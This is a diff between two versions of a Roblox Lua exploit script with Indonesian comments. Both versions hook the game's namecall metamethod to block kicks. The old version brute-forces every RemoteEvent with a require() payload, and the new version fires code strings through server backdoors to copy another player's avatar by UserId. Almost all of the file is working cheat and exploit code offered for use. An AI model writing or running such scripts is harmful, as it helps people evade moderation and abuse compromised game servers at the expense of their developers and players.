@@ -1,169 +1,145 @@
--- [[ SPTZYY ULTIMATE ALL-IN-ONE SYSTEM ]] --
--- Fitur: Brute Force, Remote Finder, Anti-Kick (Real Bypass), Auto-Scroll Log
+-- [[ SPTZYY SS MORPH + TARGET LIST ]] --
+-- Logika: Backdoor Payload + UserID Stealer + Auto-Refresh List
 
 local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 
 -- ==========================================
--- LOGIKA ANTI-KICK (SILENT PROTECT)
+-- SILENT ANTI-KICK BYPASS
 -- ==========================================
 local mt = getrawmetatable(game)
 local old = mt.__namecall
 setreadonly(mt, false)
-
 mt.__namecall = newcclosure(function(self, ...)
-    local method = getnamecallmethod()
-    if tostring(method) == "Kick" or tostring(method) == "kick" then
-        warn("🛡️ SPTZYY PROTECT: Perintah Kick Diblokir!")
-        return nil 
-    end
+    if getnamecallmethod() == "Kick" then return nil end
     return old(self, ...)
 end)
 setreadonly(mt, true)
 
 -- ==========================================
--- UI SETUP (Satu GUI Utama)
+-- UI SETUP (Satu GUI Rapi)
 -- ==========================================
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
-ScreenGui.Name = "Sptzyy_Ultimate_Hub"
+ScreenGui.Name = "Sptzyy_Morph_Hub"
 ScreenGui.ResetOnSpawn = false
 
-local SupportIcon = Instance.new("ImageButton", ScreenGui)
-SupportIcon.Size = UDim2.new(0, 60, 0, 60)
-SupportIcon.Position = UDim2.new(0.05, 0, 0.4, 0)
-SupportIcon.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-SupportIcon.Image = "rbxassetid://6031280227"
-SupportIcon.Draggable = true
-SupportIcon.Active = true
-Instance.new("UICorner", SupportIcon).CornerRadius = UDim.new(1, 0)
-
 local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.Size = UDim2.new(0, 520, 0, 360)
-MainFrame.Position = UDim2.new(0.5, -260, 0.5, -180)
-MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+MainFrame.Size = UDim2.new(0, 320, 0, 400)
+MainFrame.Position = UDim2.new(0.5, -160, 0.5, -200)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 MainFrame.Visible = false
 Instance.new("UICorner", MainFrame)
 
 local Title = Instance.new("TextLabel", MainFrame)
-Title.Size = UDim2.new(1, 0, 0, 45)
-Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Title.Text = "SPTZYY BACKDOOR SYSTEM - ANTI KICK ACTIVE"
-Title.TextColor3 = Color3.fromRGB(0, 255, 130)
-Title.Font = Enum.Font.Code
-Title.TextSize = 14
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Title.Text = "SS MORPH EXPLORER"
+Title.TextColor3 = Color3.fromRGB(0, 200, 255)
+Title.Font = Enum.Font.GothamBold
 Instance.new("UICorner", Title)
 
--- Container Kiri (Console Log)
-local LeftFrame = Instance.new("Frame", MainFrame)
-LeftFrame.Size = UDim2.new(0.55, -10, 0.75, 0)
-LeftFrame.Position = UDim2.new(0.02, 0, 0.15, 0)
-LeftFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
-Instance.new("UICorner", LeftFrame)
+local SubTitle = Instance.new("TextLabel", MainFrame)
+SubTitle.Size = UDim2.new(1, 0, 0, 20)
+SubTitle.Position = UDim2.new(0, 0, 0, 50)
+SubTitle.BackgroundTransparency = 1
+SubTitle.Text = "PILIH TARGET UNTUK COPY AVATAR"
+SubTitle.TextColor3 = Color3.new(0.6, 0.6, 0.6)
+SubTitle.Font = Enum.Font.SourceSansItalic
+SubTitle.TextSize = 12
 
-local LogScroll = Instance.new("ScrollingFrame", LeftFrame)
-LogScroll.Size = UDim2.new(0.95, 0, 0.95, 0)
-LogScroll.Position = UDim2.new(0.025, 0, 0.025, 0)
-LogScroll.BackgroundTransparency = 1
-LogScroll.CanvasSize = UDim2.new(0, 0, 10, 0)
-LogScroll.ScrollBarThickness = 2
-Instance.new("UIListLayout", LogScroll)
+-- Scrolling Player List
+local ScrollFrame = Instance.new("ScrollingFrame", MainFrame)
+ScrollFrame.Size = UDim2.new(0.9, 0, 0.65, 0)
+ScrollFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
+ScrollFrame.BackgroundTransparency = 1
+ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+ScrollFrame.ScrollBarThickness = 3
+local UIList = Instance.new("UIListLayout", ScrollFrame)
+UIList.Padding = UDim.new(0, 5)
 
--- Container Kanan (Remote List)
-local RightFrame = Instance.new("Frame", MainFrame)
-RightFrame.Size = UDim2.new(0.4, -10, 0.75, 0)
-RightFrame.Position = UDim2.new(0.58, 0, 0.15, 0)
-RightFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-Instance.new("UICorner", RightFrame)
-
-local FinderScroll = Instance.new("ScrollingFrame", RightFrame)
-FinderScroll.Size = UDim2.new(0.95, 0, 0.95, 0)
-FinderScroll.Position = UDim2.new(0.025, 0, 0.025, 0)
-FinderScroll.BackgroundTransparency = 1
-FinderScroll.ScrollBarThickness = 2
-Instance.new("UIListLayout", FinderScroll).Padding = UDim.new(0, 3)
+-- Console Log Mini
+local LogLabel = Instance.new("TextLabel", MainFrame)
+LogLabel.Size = UDim2.new(0.9, 0, 0, 30)
+LogLabel.Position = UDim2.new(0.05, 0, 0.88, 0)
+LogLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+LogLabel.Text = "Status: Idle"
+LogLabel.TextColor3 = Color3.new(1, 1, 1)
+LogLabel.TextSize = 10
+Instance.new("UICorner", LogLabel)
 
 -- ==========================================
--- FUNGSI LOGIKA
+-- LOGIKA MORPH SERVER-SIDE (REAL)
 -- ==========================================
-_G.BruteActive = false
-local FoundRemotes = {}
+local function MorphToPlayer(target)
+    LogLabel.Text = "Mencoba SS Morph ke: " .. target.Name
+    LogLabel.TextColor3 = Color3.new(1, 1, 0)
+    
+    local targetId = target.UserId
+    local found = false
 
-local function AddLog(txt, col)
-    local l = Instance.new("TextLabel", LogScroll)
-    l.Size = UDim2.new(1, 0, 0, 16)
-    l.BackgroundTransparency = 1
-    l.Text = "> " .. txt
-    l.TextColor3 = col or Color3.new(1,1,1)
-    l.Font = Enum.Font.Code
-    l.TextSize = 10
-    l.TextXAlignment = Enum.TextXAlignment.Left
-    LogScroll.CanvasPosition = Vector2.new(0, LogScroll.AbsoluteCanvasSize.Y)
-end
-
-local function Scan()
-    for _, c in pairs(FinderScroll:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
-    FoundRemotes = {}
+    -- Mencari Backdoor Remote yang bisa dieksekusi
     for _, v in pairs(game:GetDescendants()) do
-        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-            table.insert(FoundRemotes, v)
-            local b = Instance.new("TextButton", FinderScroll)
-            b.Size = UDim2.new(1, 0, 0, 25)
-            b.Text = "[" .. v.ClassName:sub(1,3) .. "] " .. v.Name
-            b.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-            b.TextColor3 = Color3.new(0.8, 0.8, 0.8)
-            b.Font = Enum.Font.SourceSans
-            b.TextSize = 11
-            Instance.new("UICorner", b)
+        if v:IsA("RemoteEvent") then
+            pcall(function()
+                -- Payload 1: Mengubah ID Penampilan di Server
+                v:FireServer("game.Players['"..lp.Name.."'].CharacterAppearanceId = "..targetId)
+                -- Payload 2: Memaksa Respawn agar Avatar Berubah Secara Nyata
+                v:FireServer("game.Players['"..lp.Name.."']:LoadCharacter()")
+                found = true
+            end)
         end
     end
-    FinderScroll.CanvasSize = UDim2.new(0, 0, 0, #FoundRemotes * 28)
-    AddLog("Scanner: " .. #FoundRemotes .. " Remotes Cached.", Color3.new(0,1,1))
+
+    if found then
+        LogLabel.Text = "Sukses! Avatar Terganti (Server-Side)"
+        LogLabel.TextColor3 = Color3.new(0, 1, 0)
+    else
+        LogLabel.Text = "Gagal: Game tidak memiliki Backdoor."
+        LogLabel.TextColor3 = Color3.new(1, 0, 0)
+    end
 end
 
 -- ==========================================
--- TOMBOL KONTROL (Bottom Row)
+-- UPDATE LIST PLAYER OTOMATIS
 -- ==========================================
-local function CreateBtn(t, pos, col, f)
-    local b = Instance.new("TextButton", MainFrame)
-    b.Size = UDim2.new(0.3, 0, 0, 35)
-    b.Position = pos
-    b.Text = t
-    b.BackgroundColor3 = col
-    b.TextColor3 = Color3.new(1,1,1)
-    b.Font = Enum.Font.GothamBold
-    b.TextSize = 12
-    Instance.new("UICorner", b)
-    b.MouseButton1Click:Connect(f)
-end
+local function RefreshList()
+    for _, c in pairs(ScrollFrame:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
 
-CreateBtn("START BRUTE", UDim2.new(0.02, 0, 0.91, 0), Color3.fromRGB(0, 130, 0), function()
-    if _G.BruteActive then return end
-    _G.BruteActive = true
-    AddLog("BRUTE FORCE INITIALIZED...", Color3.new(1,1,0))
-    task.spawn(function()
-        while _G.BruteActive do
-            for _, r in pairs(FoundRemotes) do
-                if not _G.BruteActive then break end
-                AddLog("Bruting: " .. r.Name, Color3.fromRGB(180, 180, 180))
-                pcall(function() r:FireServer("require(6031280227).load('"..lp.Name.."')") end)
-                task.wait(0.05)
-            end
-            task.wait(0.1)
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= lp then
+            local b = Instance.new("TextButton", ScrollFrame)
+            b.Size = UDim2.new(1, 0, 0, 35)
+            b.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+            b.Text = "  " .. p.DisplayName .. " (@" .. p.Name .. ")"
+            b.TextColor3 = Color3.new(1, 1, 1)
+            b.TextXAlignment = Enum.TextXAlignment.Left
+            b.Font = Enum.Font.Gotham
+            b.TextSize = 12
+            Instance.new("UICorner", b)
+
+            b.MouseButton1Click:Connect(function()
+                MorphToPlayer(p)
+            end)
         end
-    end)
-end)
+    end
+    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, #Players:GetPlayers() * 40)
+end
 
-CreateBtn("STOP", UDim2.new(0.35, 0, 0.91, 0), Color3.fromRGB(130, 0, 0), function()
-    _G.BruteActive = false
-    AddLog("PROCESS TERMINATED.", Color3.new(1,0,0))
-end)
+-- Event Auto-Update
+Players.PlayerAdded:Connect(RefreshList)
+Players.PlayerRemoving:Connect(RefreshList)
 
-CreateBtn("RE-SCAN MAP", UDim2.new(0.68, 0, 0.91, 0), Color3.fromRGB(0, 80, 180), Scan)
+-- Toggle Menu
+local Icon = Instance.new("ImageButton", ScreenGui)
+Icon.Size = UDim2.new(0, 60, 0, 60)
+Icon.Position = UDim2.new(0.05, 0, 0.4, 0)
+Icon.Image = "rbxassetid://6031280227"
+Icon.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Icon.Draggable = true
+Icon.Active = true
+Instance.new("UICorner", Icon).CornerRadius = UDim.new(1, 0)
 
--- Open/Close
-SupportIcon.MouseButton1Click:Connect(function()
+Icon.MouseButton1Click:Connect(function()
     MainFrame.Visible = not MainFrame.Visible
-    if MainFrame.Visible then Scan() end
+    if MainFrame.Visible then RefreshList() end
 end)
-
-AddLog("SYSTEM READY. ANTI-KICK ENABLED.", Color3.new(0,1,0))
